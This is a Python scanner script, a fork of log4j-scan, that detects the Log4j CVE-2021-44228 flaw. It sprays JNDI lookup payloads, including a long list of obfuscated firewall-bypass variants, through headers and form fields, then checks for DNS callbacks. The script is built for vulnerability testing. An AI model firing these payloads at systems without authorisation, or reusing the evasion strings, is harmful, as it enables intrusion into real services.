#!/usr/bin/env python3
# coding=utf-8
# ******************************************************************
# log4j-scan: A generic scanner for Apache log4j RCE CVE-2021-44228
# Author:
# Mazin Ahmed <Mazin at FullHunt.io>
# Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
# Secure your Attack Surface with FullHunt.io.
# ******************************************************************

import argparse
import random
import requests
import time
import sys
import base64
import json
import hashlib
from uuid import uuid4
from base64 import b64encode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from termcolor import cprint
import concurrent.futures
from datetime import datetime


# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass


cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
cprint('[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', "yellow")
cprint('[•] Fork created by Sergey Egorov.', "yellow")

if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)


default_headers = {
    #'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
}
post_data_parameters = ["username", "user", "email", "email_address", "password"]
timeout = 4

waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://va-{{identifier}}.{{callback_host}}/}",
                        "${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://sf-{{identifier}}.{{callback_host}}/}",
                        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}{::-p}://qz-{{identifier}}.{{callback_host}}/}",
                        "${${::-j}ndi:rmi://ad-{{identifier}}.{{callback_host}}}",
                        "${${::-j}ndi:dns://vcx-{{identifier}}.{{callback_host}}}",
                        "${${::-j}ndi:ldap://ew-{{identifier}}.{{callback_host}}}",
                        "${jndi:rmi://vc-{{identifier}}.{{callback_host}}}",
                        "${jndi:dns://wer-{{identifier}}.{{callback_host}}}",
                        "${jndi:ldap://avas-{{identifier}}.{{callback_host}}}",
                        "${${lower:jndi}:${lower:rmi}://tew-{{identifier}}.{{callback_host}}}",
                        "${${lower:jndi}:${lower:dns}://tqe-{{identifier}}.{{callback_host}}}",
                        "${${lower:jndi}:${lower:ldap}://jf-{{identifier}}.{{callback_host}}}",
                        "${${lower:${lower:jndi}}:${lower:rmi}://bd-{{identifier}}.{{callback_host}}}",
                        "${${lower:${lower:jndi}}:${lower:dns}://vv-{{identifier}}.{{callback_host}}}",
                        "${${lower:${lower:jndi}}:${lower:ldap}://se-{{identifier}}.{{callback_host}}}",
                        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://ca-{{identifier}}.{{callback_host}}}",
                        "${${lower:j}${lower:n}${lower:d}i:${lower:dns}://ba-{{identifier}}.{{callback_host}}}",
                        "${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://na-{{identifier}}.{{callback_host}}}",
                        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://yf-{{identifier}}.{{callback_host}}}",
                        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:d}n${lower:s}}://ed-{{identifier}}.{{callback_host}}}",
                        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}d${lower:a}p}://fe-{{identifier}}.{{callback_host}}}",
                        "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-r}mi${env:ENV_NAME:-:}//wa-{{identifier}}.{{callback_host}}}",
                        "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-d}ns${env:ENV_NAME:-:}//da-{{identifier}}.{{callback_host}}}",
                        "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//ff-{{identifier}}.{{callback_host}}}",
                        "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:rmi://mj-{{identifier}}.{{callback_host}}}",
                        "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:dns://gt-{{identifier}}.{{callback_host}}}",
                        "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://bf-{{identifier}}.{{callback_host}}}",
                        "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-r}mi${env:BARFOO:-:}//po-{{identifier}}.{{callback_host}}}",
                        "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-d}ns${env:BARFOO:-:}//hy-{{identifier}}.{{callback_host}}}",
                        "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//wv-{{identifier}}.{{callback_host}}}",
                        "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-r}mi${env:NaN:-:}//rn-{{identifier}}.{{callback_host}}}",
                        "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-d}ns${env:NaN:-:}//tm-{{identifier}}.{{callback_host}}}",
                        "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//ix-{{identifier}}.{{callback_host}}}",
                        "${jndi:ldap://127.0.0.1#bm-{{identifier}}.{{callback_host}}",
                        "${jndi:ldap://127.1.1.1#gd-{{identifier}}.{{callback_host}}}"
                       ]

blacklist = [
    ".pdf",
    ".css",
    ".png",
    ".js",
    ".jpg",
    "apple.com",
    "google.com",
    "bing.com",
    "xing.com",
    "youtube.com"
]

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-p", "--proxy",
                    dest="proxy",
                    help="send requests through proxy",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs.",
                    action='store')
parser.add_argument("--request-type",
                    dest="request_type",
                    help="Request Type: (get, post) - [Default: get].",
                    default="get",
                    action='store')
parser.add_argument("--headers-file",
                    dest="headers_file",
                    help="Headers fuzzing list - [default: headers.txt].",
                    default="headers.txt",
                    action='store')
parser.add_argument("--run-all-tests",
                    dest="run_all_tests",
                    help="Run all available tests on each URL.",
                    action='store_true')
parser.add_argument("--exclude-user-agent-fuzzing",
                    dest="exclude_user_agent_fuzzing",
                    help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
                    action='store_true')
parser.add_argument("--wait-time",
                    dest="wait_time",
                    help="Wait time after all URLs are processed (in seconds) - [Default: 5].",
                    default=5,
                    type=int,
                    action='store')
parser.add_argument("--waf-bypass",
                    dest="waf_bypass_payloads",
                    help="Extend scans with WAF bypass payloads.",
                    action='store_true')
parser.add_argument("--dns-callback-provider",
                    dest="dns_callback_provider",
                    help="DNS Callback provider [Default: interact.sh].",
                    default="interact.sh",
                    action='store')
parser.add_argument("--custom-dns-callback-host",
                    dest="custom_dns_callback_host",
                    help="Custom DNS Callback Host.",
                    action='store')
parser.add_argument("--disable-http-redirects",
                    dest="disable_redirects",
                    help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have higher chance of reaching vulnerable systems.",
                    action='store_true')
parser.add_argument("--threads",
                    dest="thread_workers",
                    help="Amount of threads. Default is 20.",
                    default="20",
                    action='store')
parser.add_argument("--test",
                    dest="test_host",
                    help="A canary host to test before the main list. Logs GET and POST requests examples. Default: http://127.0.0.1:8080",
                    default="http://127.0.0.1:8080",
                    action='store')

args = parser.parse_args()


proxies = {}
if args.proxy:
    proxies = {"http": args.proxy, "https": args.proxy}


def get_fuzzing_headers(payload):
    fuzzing_headers = {}
    fuzzing_headers.update(default_headers)
    with open(args.headers_file, "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            if "Authorization" in i:
                 fuzzing_headers.update({i: "Token " + payload})
            else:
                fuzzing_headers.update({i: payload})
                
    if args.exclude_user_agent_fuzzing:
        fuzzing_headers["User-Agent"] = default_headers["User-Agent"]

    fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
    return fuzzing_headers


def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    for i in post_data_parameters:
        if i == "Authorization":
                fuzzing_post_data.update({i: "Token " + payload})
        else:
            fuzzing_post_data.update({i: payload})
    return fuzzing_post_data


def generate_waf_bypass_payloads(callback_host, identifier):
    payloads = []
    for i in waf_bypass_payloads:
        new_payload = i.replace("{{callback_host}}", callback_host)
        new_payload = new_payload.replace("-{{identifier}}", identifier)
        payloads.append(new_payload)
    return payloads

class Interactsh:
    # Source: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py
    def __init__(self, token="", server=""):
        rsa = RSA.generate(2048)
        self.public_key = rsa.publickey().exportKey()
        self.private_key = rsa.exportKey()
        self.token = token
        self.server = server.lstrip('.') or 'interact.sh'
        self.headers = {
            "Content-Type": "application/json",
        }
        if self.token:
            self.headers['Authorization'] = self.token
        self.secret = str(uuid4())
        self.encoded = b64encode(self.public_key).decode("utf8")
        guid = uuid4().hex.ljust(33, 'a')
        guid = ''.join(i if i.isdigit() else chr(ord(i) + random.randint(0, 20)) for i in guid)
        self.domain = f'{guid}.{self.server}'
        self.correlation_id = self.domain[:20]

        self.session = requests.session()
        self.session.headers = self.headers
        self.session.verify = False
        self.session.proxies = proxies
        self.register()

    def register(self):
        data = {
            "public-key": self.encoded,
            "secret-key": self.secret,
            "correlation-id": self.correlation_id
        }
        res = self.session.post(
            f"https://{self.server}/register", headers=self.headers, json=data, timeout=30)
        if 'success' not in res.text:
            raise Exception("Can not initiate interact.sh DNS callback client")

    def pull_logs(self):
        result = []
        url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
        res = self.session.get(url, headers=self.headers, timeout=30).json()
        aes_key, data_list = res['aes_key'], res['data']
        for i in data_list:
            decrypt_data = self.__decrypt_data(aes_key, i)
            result.append(self.__parse_log(decrypt_data))
        return result

    def __decrypt_data(self, aes_key, data):
        private_key = RSA.importKey(self.private_key)
        cipher = PKCS1_OAEP.new(private_key, hashAlgo=SHA256)
        aes_plain_key = cipher.decrypt(base64.b64decode(aes_key))
        decode = base64.b64decode(data)
        bs = AES.block_size
        iv = decode[:bs]
        cryptor = AES.new(key=aes_plain_key, mode=AES.MODE_CFB, IV=iv, segment_size=128)
        plain_text = cryptor.decrypt(decode)
        return json.loads(plain_text[16:])

    def __parse_log(self, log_entry):
        new_log_entry = {"timestamp": log_entry["timestamp"],
                         "host": f'{log_entry["full-id"]}.{self.domain}',
                         "remote_address": log_entry["remote-address"]
                         }
        return new_log_entry

def scan_test_host(url, callback_host, logfile):
    
    cprint(f"[•] Checking Test Host {url}", "yellow")
    identifier = hashlib.md5(url.encode('utf-8')).hexdigest()[:5]
    payload = '${jndi:ldap://%s/%s}' % (callback_host,  identifier)
    payloads = [payload]
    
    if args.waf_bypass_payloads:
        payloads.extend(generate_waf_bypass_payloads(f'{callback_host}', identifier))

    for payload in payloads:
        print(f"[•] URL: {url} | PAYLOAD: {payload}", file=logfile)
        print(f"[•] Testing GET", file=logfile)
        try:
            req = requests.request(url=url,
                            method="GET",
                            params={"v": payload},
                            headers=get_fuzzing_headers(payload),
                            verify=False,
                            timeout=timeout,
                            allow_redirects=(not args.disable_redirects),
                            proxies=proxies)
            print (req.request.url, file=logfile)
            print (req.request.headers, file=logfile)
        except Exception as e:
            cprint(f"EXCEPTION: {e}")

        print(f"[•] Testing POST", file=logfile)

        try:
            req = requests.request(url=url,
                            method="POST",
                            params={"v": payload},
                            headers=get_fuzzing_headers(payload),
                            data=get_fuzzing_post_data(payload),
                            verify=False,
                            timeout=timeout,
                            allow_redirects=(not args.disable_redirects),
                            proxies=proxies)
            print (req.request.url, file=logfile)
            print (req.request.headers, file=logfile)
            print (req.request.body, file=logfile)
        except Exception as e:
            cprint(f"EXCEPTION: {e}")

def run_scan(url, payload, logfile):
    print(f"[•] URL: {url} | PAYLOAD: {payload}", file=logfile)
    if args.request_type.upper() == "GET" or args.run_all_tests:
        try:
            requests.request(url=url,
                            method="GET",
                            params={"v": payload},
                            headers=get_fuzzing_headers(payload),
                            verify=False,
                            timeout=timeout,
                            allow_redirects=(not args.disable_redirects),
                            proxies=proxies)
        except Exception as e:
            cprint(f"EXCEPTION: {e}")

    if args.request_type.upper() == "POST" or args.run_all_tests:
        try:
            # Post body
            requests.request(url=url,
                            method="POST",
                            params={"v": payload},
                            headers=get_fuzzing_headers(payload),
                            data=get_fuzzing_post_data(payload),
                            verify=False,
                            timeout=timeout,
                            allow_redirects=(not args.disable_redirects),
                            proxies=proxies)
        except Exception as e:
            cprint(f"EXCEPTION: {e}")

        try:
            # JSON body
            requests.request(url=url,
                            method="POST",
                            params={"v": payload},
                            headers=get_fuzzing_headers(payload),
                            json=get_fuzzing_post_data(payload),
                            verify=False,
                            timeout=timeout,
                            allow_redirects=(not args.disable_redirects),
                            proxies=proxies)
        except Exception as e:
            cprint(f"EXCEPTION: {e}")

def scan_url(url, callback_host, logfile):
    identifier = hashlib.md5(url.encode('utf-8')).hexdigest()[:5]
    payload = '${jndi:ldap://%s/%s}' % (callback_host,  identifier)
    payloads = [payload]

    if args.waf_bypass_payloads:
        payloads.extend(generate_waf_bypass_payloads(f'{callback_host}', identifier))
    
    if args.thread_workers:
        workers = int(args.thread_workers)
    else: 
        workers = 20  

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = []
        for payload in payloads:
            futures.append(executor.submit(run_scan, url, payload, logfile))     

def blacklist_check(i):
    for rec in blacklist:
        if rec in i:
            return False
    return True

def main():
    urls = []
    if args.url:
        urls.append(args.url)
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue                
                if blacklist_check(i) and i not in urls:
                    urls.append(i)

    dns_callback_host = ""
    if args.custom_dns_callback_host:
        cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
        dns_callback_host =  args.custom_dns_callback_host
    else:
        cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
        if args.dns_callback_provider == "interact.sh":
            dns_callback = Interactsh()
        else:
            raise ValueError("Invalid DNS Callback provider")
        dns_callback_host = dns_callback.domain

    cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
    cprint(str(len(urls)) + " URLs will be queried.", "magenta")
    filename = datetime.now().strftime("%H-%M-%S") + "-log4jscan.log"
    with open(filename, 'a') as logfile:
        if args.test_host:
            scan_test_host(args.test_host, dns_callback_host, logfile)
        for url in urls:
            cprint("[•] " + str(urls.index(url)) + f" URL: {url}", "magenta")
            scan_url(url, dns_callback_host, logfile)

    if args.custom_dns_callback_host:
        cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        print("Scan finished ", current_time)
        return

    cprint("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
    cprint("[•] Waiting...", "cyan")
    time.sleep(int(args.wait_time))
    records = dns_callback.pull_logs()
    if len(records) == 0:
        cprint("[•] Targets does not seem to be vulnerable.", "green")
    else:
        cprint("[!!!] Target Affected", "yellow")
        for i in records:
            cprint(i, "yellow")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
